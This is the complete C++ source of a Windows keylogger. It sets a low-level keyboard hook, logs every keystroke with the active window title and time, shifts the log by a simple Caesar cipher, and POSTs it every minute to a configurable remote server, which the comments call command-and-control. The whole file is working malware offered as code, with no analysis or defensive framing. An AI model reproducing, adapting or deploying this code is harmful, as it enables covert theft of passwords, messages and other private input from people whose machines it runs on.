#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <fstream>
#include <atomic>
#include <mutex>

#pragma comment(lib,"ws2_32.lib")

//#define DEBUG

#define EXFIL_INTERVAL 1*60*1000
constexpr auto LOGGEDKEYSSIZE = 100000;


#define REMOTE_ADDR_NAME "127.0.0.1"
#define REMOTE_PORT 80

// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);

extern char lastwindow[256];

char loggedKeys[LOGGEDKEYSSIZE];

std::mutex mymutex;

// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.sdasd
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// save to file
			Save(kbdStruct.vkCode);
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookExA(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
#ifdef DEBUG
		printf("Failed to install hook!");
#endif //DEBUG
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
	std::lock_guard<std::mutex> g(mymutex);

#ifdef DEBUG
	printf("inside Save\n");
#endif //DEBUG

	char lastwindow[256];

	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; // ignore mouse clicks

	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = 0;
	if (foreground) {
		//get keyboard layout of the thread
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	if (foreground)
	{
		char window_title[256];
		GetWindowTextA(foreground, window_title, 256);

		if (strcmp(window_title, lastwindow) != 0) {
			strcpy_s(lastwindow, window_title);

			// get time
			time_t t = time(NULL);
			struct tm tmm;
			localtime_s(&tmm, &t);
			char s[64];
			strftime(s, sizeof(s), "%c", &tmm);

			strcat_s(loggedKeys, "\n\n[Window: ");
			strcat_s(loggedKeys, window_title);
			strcat_s(loggedKeys, " - at ");
			strcat_s(loggedKeys, s);
			strcat_s(loggedKeys, "] ");
		}
	}


	if (key_stroke == VK_BACK)
		strcat_s(loggedKeys, "[BACKSPACE]");
	else if (key_stroke == VK_RETURN)
		strcat_s(loggedKeys, "\n");
	else if (key_stroke == VK_SPACE)
		strcat_s(loggedKeys, " ");
	else if (key_stroke == VK_TAB)
		strcat_s(loggedKeys, "[TAB]");
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		strcat_s(loggedKeys, "[SHIFT]");
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		strcat_s(loggedKeys, "[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		strcat_s(loggedKeys, "[ESCAPE]");
	else if (key_stroke == VK_END)
		strcat_s(loggedKeys, "[END]");
	else if (key_stroke == VK_HOME)
		strcat_s(loggedKeys, "[HOME]");
	else if (key_stroke == VK_LEFT)
		strcat_s(loggedKeys, "[LEFT]");
	else if (key_stroke == VK_UP)
		strcat_s(loggedKeys, "[UP]");
	else if (key_stroke == VK_RIGHT)
		strcat_s(loggedKeys, "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		strcat_s(loggedKeys, "[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		strcat_s(loggedKeys, ".");
	else if (key_stroke == 189 || key_stroke == 109)
		strcat_s(loggedKeys, "-");
	else if (key_stroke == 20)
		strcat_s(loggedKeys, "[CAPSLOCK]");
	else {
		char key;
		// check caps lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// check shift key
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
			lowercase = !lowercase;
		}

		//map virtual key according to keyboard layout 
		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		//tolower converts it to lowercase properly
		if (!lowercase) key = tolower(key);
		char keyStr[2] = { key, 0x00 };
		strcat_s(loggedKeys, keyStr);
#ifdef DEBUG
		printf("THIS IS ME KEY = %s", keyStr);
#endif //DEBUG

	}
	//instead of opening and closing file handlers every time, keep file open and flush.
	return 0;
}

void exfilLoggedKeys()
{
	std::lock_guard<std::mutex> g(mymutex);

#ifdef DEBUG
	printf(loggedKeys);
#endif //DEBUG


	// unwise to send out unncessary C&C traffic
	long content_length = strlen(loggedKeys);
	if (content_length == 0)
		return;

	// encrypt via Caesar cipher, N=+1
	for (UINT64 i = 0; i < LOGGEDKEYSSIZE; i++)
	{
		if (loggedKeys[i] == 0)
		{
			break;
		}
		loggedKeys[i] = loggedKeys[i] + 1;
	}

	// POST encrypted keys to server
	char request[LOGGEDKEYSSIZE + 300];
	sprintf_s(request,
		"POST / HTTP/1.0\r\nContent-Length: %d\r\n\r\n%s",
		content_length,
		loggedKeys
	);
	WSADATA wsaData;
	SOCKET Socket;
	SOCKADDR_IN SockAddr;
	struct hostent* host;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
#ifdef DEBUG
		printf("WSAStartup failed.\n");
#endif //DEBUG

		return;
	}
	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	host = gethostbyname(REMOTE_ADDR_NAME);
	SockAddr.sin_port = htons(REMOTE_PORT);
	SockAddr.sin_family = AF_INET;
	SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
	if (connect(Socket, (SOCKADDR*)(&SockAddr), sizeof(SockAddr)) != 0) {
#ifdef DEBUG
		printf("Could not connect");
#endif //DEBUG

		return;
	}
	// send GET / HTTP
	send(Socket, request, strlen(request), 0);
	closesocket(Socket);


	// Clear loggedKeys
	ZeroMemory(loggedKeys, LOGGEDKEYSSIZE);
}


std::atomic<bool> timeToExfil;
bool firstTime = TRUE;

DWORD ExfilAndClearLoggedKeys(PVOID p)
{
#ifdef DEBUG
	printf("ExfilAndClearLoggedKeys");
#endif //DEBUG

	if (firstTime)
	{
		firstTime = FALSE;
	}
	else
	{
		exfilLoggedKeys();
	}
#ifdef DEBUG
	printf("sleeping...\n");
#endif //DEBUG

	Sleep(EXFIL_INTERVAL);
#ifdef DEBUG
	printf("sleeping complete\n");
#endif //DEBUG
	timeToExfil.store(TRUE, std::memory_order_relaxed);
	return 0;
}

DWORD WINAPI ExfilLoop(PVOID p)
{
	while (TRUE)
	{
		if (timeToExfil.load(std::memory_order_relaxed))
		{
#ifdef DEBUG
			printf("creating thread..\n");
#endif // DEBUG
			timeToExfil = FALSE;
			ExfilAndClearLoggedKeys(NULL);
		}
	}
	return 0;
}

void Payload()
{
	timeToExfil.store(TRUE, std::memory_order_relaxed);
	ZeroMemory(loggedKeys, LOGGEDKEYSSIZE);

	// Set the hook
	SetHook();

#ifdef DEBUG
	printf("Hook set\n");
#endif // DEBUG

	// loop to keep the console application running.
	CloseHandle(
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExfilLoop, NULL, 0, NULL)
	);
	MSG msg;
	BOOL res;
	while (TRUE)
	{
		res = GetMessage(&msg, NULL, 0, 0);
	}
}

int main()
{
	Payload();
}
